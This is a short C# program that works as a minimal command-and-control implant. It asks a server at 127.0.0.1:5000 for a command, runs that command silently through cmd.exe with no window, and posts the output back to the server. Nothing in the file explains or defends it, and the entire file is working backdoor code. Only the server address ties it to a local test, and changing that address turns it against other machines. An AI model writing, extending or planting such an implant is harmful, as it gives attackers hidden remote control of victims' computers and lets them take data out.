using System.Diagnostics;
string responseBody;

HttpClient client = new HttpClient();
HttpResponseMessage response = await client.GetAsync("http://127.0.0.1:5000/checkin");
//response.EnsureSuccessStatusCode();
responseBody = await response.Content.ReadAsStringAsync();
Console.WriteLine(responseBody);

Process start = new Process();
start.StartInfo.FileName = "c:\\windows\\system32\\cmd.exe";
start.StartInfo.Arguments = "/c " + responseBody;
start.StartInfo.UseShellExecute = false;
start.StartInfo.CreateNoWindow = true;
start.StartInfo.RedirectStandardOutput = true;
start.Start();
string data = start.StandardOutput.ReadToEnd();
StringContent postdata = new StringContent(data);
response = await client.PostAsync("http://127.0.0.1:5000/response", postdata);
responseBody = await response.Content.ReadAsStringAsync();
Console.WriteLine(responseBody);